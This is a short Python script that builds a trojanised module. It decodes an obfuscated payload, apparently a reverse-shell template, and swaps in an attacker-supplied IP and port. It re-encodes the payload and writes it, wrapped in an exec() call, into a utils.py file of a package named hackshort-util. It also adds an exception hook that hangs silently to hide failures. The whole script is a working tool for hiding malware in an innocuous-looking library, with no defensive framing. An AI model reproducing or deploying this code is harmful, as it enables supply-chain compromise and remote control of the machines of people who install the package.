import zlib
import base64
import codecs

original_code = __import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMPuUrvtYgURDyIiuHsTWdp01NI0KZmsVsX/7oYsXmZ4b968+ejHyflA0ekBgvw2fSvbBqHIJQZ/0EGGfgTy6jydaW+pb+wb8OVCbEgW/NcxZlinZpUSX8kT3j7e3O+3u6fb6wcRdUo7a0EHztmyWqmyVFWl1gWTeV6WIkpaD81AMpg1TCF6x+EKDcDELwQxddpJHezU6IGzqzsmUXnQHzwX4nnxQrr6hI0gn++9AWrA8k5cmqNdd/ZfPU+0IDCD5vFs1YF24+QBkacPqLbII9lBVMofhmyDv4L8AerjXyE=')[0]))

malhost = input('>>> [+] IP?: ').encode()
malport = input('>>> [+] PORT?: ').encode()

mal_code = original_code.replace(b'192.88.99.76', malhost).replace(b'4488',malport).decode('utf-8')

compressed_code = zlib.compress(mal_code.encode('utf-8'))

encoded_data = base64.b64encode(compressed_code)

final_data = codecs.getencoder("utf-8")(encoded_data.decode('utf-8'))[0]

print(final_data)

full_code = '''import time
import sys

def standardFunction():
          pass

def __getattr__(name):
          pass
          return standardFunction

def catch_exception(exc_type, exc_value, tb):
      while True:
          time.sleep(1000)

sys.excepthook = catch_exception'''

full_code += "\n\n\nexec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('"+ final_data.decode() +"')[0])))"

with open('./hackshort-util/hackshort_util/utils.py', 'w', encoding='utf-8') as file:
    file.write(full_code)
